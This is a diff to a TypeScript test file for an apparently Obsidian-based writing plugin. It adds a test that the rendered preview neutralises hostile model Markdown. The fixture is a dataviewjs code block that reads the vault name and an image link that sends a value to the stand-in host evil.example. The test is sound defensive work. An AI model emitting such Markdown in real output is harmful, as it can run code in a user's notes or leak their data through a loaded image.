@@ -27,7 +27,7 @@ interface Messung {
   gedanke: string;
 }
 
-function baue(lauf: (req: RunRequest, root: unknown) => void): { view: LingoTunerView; root: ReturnType<typeof makeFakeEl>; messung: Messung | null } {
+function baue(lauf: (req: RunRequest, root: unknown) => void, antwort = "Erster Absatz.\n\nLaufender"): { view: LingoTunerView; root: ReturnType<typeof makeFakeEl>; messung: Messung | null } {
   const halter: { root: ReturnType<typeof makeFakeEl> | null; messung: Messung | null } = { root: null, messung: null };
   const dials: Dials = { ...NEUTRAL };
   const deps: ViewDeps = {
@@ -48,7 +48,7 @@ function baue(lauf: (req: RunRequest, root: unknown) => void): { view: LingoTune
     run: (req) => {
       lauf(req, halter.root);
       halter.messung = messe(halter.root);
-      return Promise.resolve({ ok: true, text: "Erster Absatz.\n\nLaufender", reasoning: "", model: "m", truncated: false });
+      return Promise.resolve({ ok: true, text: antwort, reasoning: "", model: "m", truncated: false });
     },
     output: () => Promise.resolve(),
     activeElement: () => null,
@@ -122,5 +122,17 @@ describe("Stream in den Kit-Bereich", () => {
     // Nach dem Schluss-Draw steht der Gedanke weiterhin da (Kit `setReasoning` aus dem Modell).
     expect(findByClass<El>(a.root, "okit-stream-reasoning")?.textContent).toContain("denkt nach");
     expect(findByClass<El>(a.root, "okit-stream-reasoning")?.open).toBe(true);
+  });
+
+  it("die fertige Vorschau rendert Modell-Markdown neutralisiert (kein Code-Block-Prozessor, kein Bild)", async () => {
+    const boese = "```dataviewjs\ndv.paragraph(app.vault.getName())\n```\n\n![x](https://evil.example/?d=geheim)";
+    const a = baue(() => { /* kein Strom, nur das Ergebnis */ }, boese);
+    (a.view as unknown as { note: string }).note = "duzen";
+    await (a.view as unknown as { run(b: number | null): Promise<void> }).run(null);
+
+    const text = (findAllByClass<El>(a.root, "okit-stream-block").map((b) => b.textContent ?? "")).join("\n");
+    expect(text).not.toContain("```dataviewjs");
+    expect(text).toContain("ˋˋˋdataviewjs");
+    expect(text).not.toContain("![x]");
   });
 });
